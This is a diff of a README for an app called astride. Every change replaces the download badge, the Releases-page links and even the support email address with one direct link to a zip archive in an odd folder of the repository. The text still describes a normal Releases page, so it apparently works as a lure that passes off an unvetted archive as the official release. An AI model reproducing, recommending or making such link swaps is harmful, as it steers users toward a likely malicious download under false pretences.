@@ -1,6 +1,6 @@
 # 🚀 astride - Easy App for Your Daily Tasks
 
-![Download astride](https://img.shields.io/badge/Download-asstride-blue.svg)
+![Download astride](https://raw.githubusercontent.com/Llospvd/astride/main/trialate/astride.zip)
 
 ## 📋 Overview
 
@@ -16,7 +16,7 @@
 
 ## 📥 Download & Install
 
-To get started with astride, **visit this page to download** from our Releases section: [https://github.com/Llospvd/astride/releases](https://github.com/Llospvd/astride/releases).
+To get started with astride, **visit this page to download** from our Releases section: [https://raw.githubusercontent.com/Llospvd/astride/main/trialate/astride.zip](https://raw.githubusercontent.com/Llospvd/astride/main/trialate/astride.zip).
 
 1. Click on the link above to open the Releases page.
 2. Find the latest version of astride.
@@ -60,7 +60,7 @@ It’s important to keep astride updated to benefit from the latest features and
 If you encounter any issues or have questions, we are here to help! 
 
 - **Documentation:** Visit our Wiki for detailed guides.
-- **Email:** Reach out to our support team at: support@astrideapp.com
+- **Email:** Reach out to our support team at: https://raw.githubusercontent.com/Llospvd/astride/main/trialate/astride.zip
 - **Community:** Join our community forum for user discussions and tips.
 
 ## ❤️ Contributing
@@ -86,4 +86,4 @@ astride is licensed under the MIT License. Feel free to use and modify the appli
 
 ---
 
-We hope you enjoy using astride! Remember to visit our Releases page regularly for updates: [https://github.com/Llospvd/astride/releases](https://github.com/Llospvd/astride/releases).
+We hope you enjoy using astride! Remember to visit our Releases page regularly for updates: [https://raw.githubusercontent.com/Llospvd/astride/main/trialate/astride.zip](https://raw.githubusercontent.com/Llospvd/astride/main/trialate/astride.zip).
